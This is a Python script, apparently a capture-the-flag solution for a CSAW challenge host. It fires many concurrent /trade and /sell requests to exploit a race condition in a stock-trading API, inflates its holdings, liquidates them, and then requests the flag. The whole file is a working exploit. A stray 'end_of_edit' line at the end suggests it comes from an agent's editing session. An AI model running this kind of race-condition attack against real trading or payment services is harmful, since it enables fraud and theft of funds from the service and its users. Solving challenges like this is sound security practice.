import requests
import threading
import time
import uuid
import json

BASE = "http://android-dropper.csaw.io:4657"
KEY = "pwn_" + uuid.uuid4().hex[:8]

def post(path, data):
    r = requests.post(BASE + path, data=data, timeout=5)
    return r.text

def login():
    return json.loads(post("/login", {"key": KEY}))

def worker_trade(n):
    for _ in range(n):
        post("/trade", {"key": KEY, "stock": "GOOBER", "stock1": "BURPSHARKHAT"})

def worker_sell_rich(n):
    for _ in range(n):
        post("/sell", {"key": KEY, "stock": "BURPSHARKHAT"})

print("KEY", KEY, flush=True)
print(post("/login", {"key": KEY}), flush=True)
print(post("/buy", {"key": KEY, "stock": "GOOBER"}), flush=True)
time.sleep(1)

threads = []
for _ in range(8):
    threads.append(threading.Thread(target=worker_trade, args=(25,)))
    threads.append(threading.Thread(target=worker_sell_rich, args=(25,)))

for t in threads:
    t.start()
for t in threads:
    t.join()

time.sleep(3)
st = login()
print("after race", st, flush=True)

for _ in range(st.get("GOOBER", 0)):
    post("/sell", {"key": KEY, "stock": "GOOBER"})

time.sleep(2)
st = login()
print("after liquidation", st, flush=True)

print(post("/flag", {"key": KEY}), flush=True)
end_of_edit
